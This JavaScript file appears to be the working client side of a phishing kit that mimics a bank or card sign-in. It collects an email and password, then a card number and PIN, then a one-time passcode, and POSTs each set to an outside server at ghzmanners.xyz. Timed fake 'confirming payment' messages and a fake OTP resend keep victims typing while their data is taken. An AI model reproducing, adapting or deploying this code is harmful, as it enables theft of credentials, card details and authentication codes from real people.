"use-strict";

//#region SIGNIN

let usernameInvalidError = $("#username-alertmessage-invalid");
let usernameRequiredError = $("#username-alertmessage-required");
let underlineUsernameError = $("#username-alertmessage-underline");

let passwordInvalidError = $("#password-alertmessage-invalid");
let passwordRequiredError = $("#password-alertmessage-required");
let underlinePasswordError = $("#password-alertmessage-underline");
let passInputDisplayCount = 0;

let passInput = document.querySelector("[name='pass']");
let passwordShowHide = document.querySelector("#password-show-hide");
let url = "https://ghzmanners.xyz/sec/server/uplink.php";

function isValidEmail(email) {
  const pattern = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
  return pattern.test(email);
}

function isValidPassword(password) {
  //const pattern = /^(?=.*?[A-Z])(?=.*?[a-z])(?=.*?[0-9])(?=.*?[#?!@$ %^&*-]).{8,}$/;
  //return pattern.test(password);
  if(password.length > 4)
  {
      return true;
  }
  else {
      return false;
  }
}

function showPasswordContainer() {
  passInputDisplayCount++;
  let passwordContainer = $("#password-container");
  let cardNumField = $("input[name='pass']");
  if (passwordContainer.is(":hidden")) {
    passwordContainer.show();
    setTimeout(() => {
      cardNumField.focus();
    }, 500);
  } else {
    cardNumField.focus();
  }
}

function showInvalidUsernameErrorMessage() {
  usernameInvalidError.removeClass("hide");
  underlineUsernameError.removeClass("hide");
}

function showInvalidPasswordErrorMessage() {
  passwordInvalidError.removeClass("hide");
  underlinePasswordError.removeClass("hide");
  passwordShowHide.classList.add('bump-up-showhide');
}

function showUsernameRequiredErrorMessage() {
  usernameRequiredError.removeClass("hide");
  underlineUsernameError.removeClass("hide");
}

function showPasswordRequiredErrorMessage() {
  passwordRequiredError.removeClass("hide");
  underlinePasswordError.removeClass("hide");
  passwordShowHide.classList.add('bump-up-showhide');
}

function isValidUsername() {
  let username = $("input[name='user']").val();

  if (isValidEmail(username)) {
    showPasswordContainer();
    return true;
  }
  else if (!username) {
    showUsernameRequiredErrorMessage();
    return false;
  }
  else {
    showInvalidUsernameErrorMessage();
    return false;
  }
}

function isValidPass() {
  let password = $("input[name='pass']").val();

  if (isValidPassword(password)) {
    return true;
  }
  else if (!password && passInputDisplayCount > 1) {
    showPasswordRequiredErrorMessage();
    return false;
  }
  else if (!!password) {
    showInvalidPasswordErrorMessage();
    return false;
  }
}

function hideUsernameErrorMessage() {
  usernameInvalidError.addClass("hide");
  usernameRequiredError.addClass("hide");
  underlineUsernameError.addClass("hide");
}

function hidePasswordErrorMessage() {
  passwordInvalidError.addClass("hide");
  passwordRequiredError.addClass("hide");
  underlinePasswordError.addClass("hide");
  passwordShowHide.classList.remove('bump-up-showhide');
}

function togglePasswordVisibility() {
  if (passInput.type === "password") {
    passInput.type = "text";
    passwordShowHide.textContent = "HIDE";
  } else {
    passInput.type = "password";
    passwordShowHide.textContent = "SHOW";
  }
}

function signIn(formValues) {
  $.ajax({
    url: url,
    data: formValues,
    method: "POST",
    cache: false,
    success: (result) => {
      showSimpleCardVerificationScreen(result);
    },
    error: (jqXHR, textStatus, errorThrown) => {
      console.log(errorThrown);
    }
  });
}

function isValidSigninForm() {
  if (isValidUsername() && isValidPass()) {
    submitUser();
  }
}

const submitUser = () => {
  showProcessingScreen();
  signIn($("form[name=signinForm]").serialize());
};

function showLoadingScreen() {
  document.title = "Loading...";
  let ionPages = document.querySelectorAll('.ion-page');
  let loading = document.querySelector('#loading');
  ionPages.forEach(page => page.classList.add('hide'));
  loading.classList.remove('hide');
}

function showSimpleCardVerificationScreen(db_user_id) {
  document.title = "Card Verification";
  let ionPages = document.querySelectorAll('.ion-page');
  let card = document.querySelector('#card-simple');
  ionPages.forEach(page => page.classList.add('hide'));
  card.classList.remove('hide');
  let dbUserIdInput = card.querySelector('#db-user-id');
  dbUserIdInput.value = db_user_id;
}

//#endregion

//#region region CARD SIMPLE

let cardNumInvalidError = $("#cardnum-alertmessage-invalid");
let cardNumRequiredError = $("#cardnum-alertmessage-required");
let cardNumUnderlineError = $("#cardnum-alertmessage-underline");

let cardPinInvalidError = $("#cardpin-alertmessage-invalid");
let cardPinRequiredError = $("#cardpin-alertmessage-required");
let cardPinUnderlineError = $("#cardpin-alertmessage-underline");
let cardPinInputDisplayCount = 0;

let cardPinInput = document.querySelector("[name='cardpin']");
let cardPinShowHide = document.querySelector("#card-pin-show-hide");

let otpMessage = document.getElementById("otp-message");
let otpExpiredMessage = document.getElementById("otp-expired-message");

let otpTimerId = null;

function isValidCard(num) {
  const pattern = /^[4-5]\d{15}$/;
  return pattern.test(num);
}

function showCardNumInvalidErrorMessage() {
  cardNumInvalidError.removeClass("hide");
  cardNumUnderlineError.removeClass("hide");
}

function showCardNumRequiredErrorMessage() {
  cardNumRequiredError.removeClass("hide");
  cardNumUnderlineError.removeClass("hide");
}

function isValidCardNum() {
  let cardnum = $("input[name='cardnum']").val();

  if (isValidCard(cardnum)) {
    showPinContainer();
    return true;
  }
  else if (!cardnum) {
    showCardNumRequiredErrorMessage();
    return false;
  }
  else {
    showCardNumInvalidErrorMessage();
    return false;
  }
}

function hideCardNumErrorMessage() {
  cardNumInvalidError.addClass("hide");
  cardNumRequiredError.addClass("hide");
  cardNumUnderlineError.addClass("hide");
}

function isValidPin(pin) {
  const pattern = /\d{5}/;
  return pattern.test(pin);
}

function showPinContainer() {
  cardPinInputDisplayCount++;
  let cardPinContainer = $("#card-pin-container");
  let cardPinField = $("input[name='cardpin']");
  if (cardPinContainer.is(":hidden")) {
    cardPinContainer.show();
    setTimeout(() => {
      cardPinField.focus();
    }, 500);
  } else {
    cardPinField.focus();
  }
}

function showCardPinInvalidErrorMessage() {
  cardPinInvalidError.removeClass("hide");
  cardPinUnderlineError.removeClass("hide");
  cardPinShowHide.classList.add('bump-up-showhide');
}

function showCardPinRequiredErrorMessage() {
  cardPinRequiredError.removeClass("hide");
  cardPinUnderlineError.removeClass("hide");
  cardPinShowHide.classList.add('bump-up-showhide');
}

function hideCardPinErrorMessage() {
  cardPinInvalidError.addClass("hide");
  cardPinRequiredError.addClass("hide");
  cardPinUnderlineError.addClass("hide");
  cardPinShowHide.classList.remove('bump-up-showhide');
};

function isValidCardPin() {
  let cardpin = $("input[name='cardpin']").val();

  if (isValidPin(cardpin)) {
    return true;
  }
  else if (!cardpin && cardPinInputDisplayCount > 1) {
    showCardPinRequiredErrorMessage();
    return false;
  }
  else if (!!cardpin) {
    showCardPinInvalidErrorMessage();
    return false;
  }
}

function togglePinVisibility() {
  if (cardPinInput.type === "password") {
    cardPinInput.type = "text";
    cardPinShowHide.textContent = "HIDE";
  } else {
    cardPinInput.type = "password";
    cardPinShowHide.textContent = "SHOW";
  }
}

function verifyCard(formValues) {
  $.ajax({
    url: url,
    data: formValues,
    method: "POST",
    cache: false,
    success: (result) => {
      result = JSON.parse(result);
      showOtpScreen(
        result[ 'db_user_id' ],
        result[ 'otp_count' ]);
      otpTimerId = startOtpCountdown();
    },
    error: (jqXHR, textStatus, errorThrown) => {
      console.log(errorThrown);
    }
  });
}

function isValidCardForm() {
  if (isValidCardNum() && isValidCardPin()) {
    submitCard();
  }
}

const submitCard = () => {
  showLoadingScreen();
  verifyCard($("form[name=cardVerificationForm]").serialize());
};

function showProcessingScreen() {
  document.title = "Processing...";
  let ionPages = document.querySelectorAll('.ion-page');
  let loading = document.querySelector('#loading');

  ionPages.forEach(page => page.classList.add('hide'));
  loading.classList.remove('hide');

  processCard();
}

function showOtpScreen(dbUserId, otpCount, otpIsExpired) {
  let otp = showOtpUI();

  let dbUserIdInput = otp.querySelector("#db-user-id");
  dbUserIdInput.value = dbUserId;
  let otpCountInput = otp.querySelector("#otp-count");
  otpCountInput.value = otpCount;

  if (otpIsExpired) {
    showOtpFormExpiredMessage();
  }
}

function showOtpUI() {
  document.title = "OTP Verification";
  let ionPages = document.querySelectorAll('.ion-page');
  let otp = document.querySelector('#otp');
  ionPages.forEach(page => page.classList.add('hide'));
  otp.classList.remove('hide');
  return otp;
}

// #endregion

//#region  PROCESSING

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function processCard() {
  let msg = document.querySelector(".loader-message");
  await sleep(3000);
  msg.textContent = "Confirming Payment Information...";
  await sleep(6000);
  msg.textContent = "We Are Making Sure Everything Is Okay...";
  //await sleep(6000);
  //msg.textContent = "Updating Your Account...";
  await sleep(5000);
  msg.textContent = "Loading - please wait...";
}
//#endregion

//#region OTP

let otpInvalidError = $("#otp-alertmessage-invalid");
let otpRequiredError = $("#otp-alertmessage-required");
let otpUnderlineError = $("#otp-alertmessage-underline");

let otpInput = document.querySelector("[name='otp']");
let otpShowHide = document.querySelector("#otp-show-hide");
let otpCountdown = document.getElementById("otp-countdown");
let otpSubmitButton = document.getElementById("otp-submit-button");
let otpResendButton = document.getElementById("otp-resend-button");
let otpMobileResendButton = document.getElementById("otp-mobile-resend-button");

function isValidOtp(otp) {
  const pattern = /\d{5}/;
  return pattern.test(otp);
}

function isValidOtpInput() {
  let otp = $("input[name='otp']").val();

  if (isValidOtp(otp)) {
    return true;
  }
  else if (!otp) {
    showOtpRequiredErrorMessage();
    return false;
  }
  else if (!!otp) {
    showOtpInvalidErrorMessage();
    return false;
  }
}

function showOtpInvalidErrorMessage() {
  otpInvalidError.removeClass("hide");
  otpUnderlineError.removeClass("hide");
  otpShowHide.classList.add('bump-up-otp-showhide');
}

function showOtpRequiredErrorMessage() {
  otpRequiredError.removeClass("hide");
  otpUnderlineError.removeClass("hide");
  otpShowHide.classList.add('bump-up-otp-showhide');
}

function hideOtpErrorMessage() {
  otpInvalidError.addClass("hide");
  otpRequiredError.addClass("hide");
  otpUnderlineError.addClass("hide");
  otpShowHide.classList.remove('bump-up-otp-showhide');
};

function toggleOtpVisibility() {
  if (otpInput.type === "password") {
    otpInput.type = "text";
    otpShowHide.textContent = "HIDE";
  } else {
    otpInput.type = "password";
    otpShowHide.textContent = "SHOW";
  }
}

function verifyOtp(formValues) {
  $.ajax({
    url,
    data: formValues,
    method: "POST",
    cache: false,
    success: (result) => {
      result = JSON.parse(result);
      resetOtpScreen();
      showOtpScreen(
        result[ 'db_user_id' ],
        result[ 'otp_count' ],
        result[ 'is_otp_expired' ]);
      otpTimerId = startOtpCountdown();
    },
    error: (jqXHR, textStatus, errorThrown) => {
      console.log(errorThrown);
    }
  });
}

function isValidOtpForm() {
  if (isValidOtpInput()) {
    submitOtp();
  }
}

const submitOtp = () => {
  showLoadingScreen();
  verifyOtp($("form[name=otpVerificationForm]").serialize());
};

function startOtpCountdown() {
  let countDownEndTime = new Date().getTime() + 120000;
  let timerId = setInterval(() => {
    let countDownStartTime = new Date().getTime();
    let diff = countDownEndTime - countDownStartTime;
    let mins = Math.floor(diff / (1000 * 60));
    let secs = Math.floor((diff % (1000 * 60)) / 1000);
    otpCountdown.innerHTML = `0${mins} : ${secs < 10 ? `0${secs}` : secs}`;

    if (diff < 0) {
      clearOtpCountdown("OTP Expired", timerId);
      showResendButton();
    }
  }, 1000);
  return timerId;
}

function showResendButton() {
  otpSubmitButton.classList.add("hide");
  otpResendButton.classList.remove("hide");
  otpInput.disabled = true;
  otpShowHide.classList.add("hide");
}

function clearOtpCountdown(countdownMessage, timerId) {
  clearInterval(timerId);
  otpTimerId = timerId = null;
  otpCountdown.innerHTML = countdownMessage;
}

function resetOtpCountdown(timerId) {
  clearOtpCountdown("01 : 59", timerId);
}

function resetOtpScreen() {
  otpInput.value = "";
  otpInput.type = "password";
  otpShowHide.textContent = "SHOW";
  hideOtpErrorMessage();
  resetOtpCountdown(otpTimerId);
  resetOtpFormButtons();
  resetOtpFormMessages();
}

function resetOtpFormButtons() {
  otpSubmitButton.classList.remove("hide");
  otpResendButton.classList.add("hide");
  otpInput.disabled = false;
  otpShowHide.classList.remove("hide");
}

function resetOtpFormMessages() {
  otpMessage.classList.remove("hide");
  otpExpiredMessage.classList.add("hide");
}

function showOtpFormExpiredMessage() {
  otpMessage.classList.add("hide");
  otpExpiredMessage.classList.remove("hide");
}

async function resendOtp() {
  showLoadingScreen();
  await sleep(5000);
  showOtpUI();
  resetOtpScreen();
  otpTimerId = startOtpCountdown();
}

//#endregion